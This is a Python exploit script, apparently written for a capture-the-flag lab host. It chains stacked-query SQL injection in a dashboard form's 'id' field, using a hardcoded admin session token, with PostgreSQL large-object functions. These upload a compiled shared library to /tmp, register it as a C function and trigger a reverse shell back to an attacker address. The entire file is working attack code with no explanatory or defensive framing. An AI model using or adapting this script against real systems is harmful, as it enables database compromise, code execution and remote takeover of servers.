#!/usr/bin/python3

import requests
import random
import string
from urllib.parse import quote_plus
import math

# Parameters for call to rev_shell
LHOST = "10.10.14.6"
LPORT = 443

# Generate a random string
def randomString(N):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=N))

# Inject a query
def sqli(q):
    session = requests.session()
    burp0_url = "http://10.129.233.246:8080/dashboard/edit"
    burp0_cookies = {"Authentication": "eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTc1NzM0NzY4OCwiZXhwIjoxNzU3MzU2MzI4fQ.h1LQa-ffvGfz5Rbun37QI2-p4wHO8vT2iKg_DbSM8bivos5-zNb-SwAyTCKnajdZyRoZeF5FltYYWSETzYHUZw"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "http://10.129.233.246:8080/dashboard?e=Added+password!", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://10.129.233.246:8080", "DNT": "1", "Connection": "keep-alive", "Upgrade-Insecure-Requests": "1", "Sec-GPC": "1", "Priority": "u=0, i"}
    q = q.replace("'", "$$")
    print(q)
    burp0_data = {"title": "test", "username": "test", "password": "test1", "id": f"34;{q};--"}
    session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

# Read the compiled extension
with open("pg_rev_shell.so","rb") as f:
    raw = f.read()

# Create a large object
loid = random.randint(50000,60000)
sqli(f"SELECT lo_create({loid});")
print(f"[*] Created large object with ID: {loid}")

# Upload pg_rev_shell.so to large object
for pageno in range(math.ceil(len(raw)/2048)):
    page = raw[pageno*2048:pageno*2048+2048]
    print(f"[*] Uploading Page: {pageno}, Length: {len(page)}")
    sqli(f"SELECT lo_put({loid}, {pageno * 2048}, decode($${page.hex()}$$,$$hex$$));")
    

# Write large object to file and run reverse shell
query  = f"SELECT lo_export({loid}, '/tmp/pg_rev_shell.so');"
query += f"SELECT lo_unlink({loid});"
query += "DROP FUNCTION IF EXISTS rev_shell;"
query += "CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell', 'rev_shell' LANGUAGE C STRICT;"
query += f"SELECT rev_shell('{LHOST}', {LPORT});"
print(f"[*] Writing pg_rev_shell.so to disk and triggering reverse shell (LHOST: {LHOST}, LPORT: {LPORT})")
sqli(query)